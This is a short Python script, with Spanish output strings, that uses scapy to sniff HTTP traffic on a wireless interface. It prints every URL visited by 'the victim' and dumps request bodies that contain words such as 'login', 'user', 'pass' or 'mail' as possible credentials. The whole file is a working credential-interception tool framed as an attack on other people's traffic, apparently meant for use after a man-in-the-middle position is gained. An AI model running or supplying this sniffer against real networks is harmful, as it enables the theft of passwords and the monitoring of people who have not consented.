#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def process_packet(packet):

    cred_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):
        
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(f"[+] URL visitada por la victima: {url}")

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                if any(keyword in response for keyword in cred_keywords):
                    print(f"\n[+] Posibles credenciales: {response}\n")
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("wlan1")

if __name__ == "__main__":
    main()
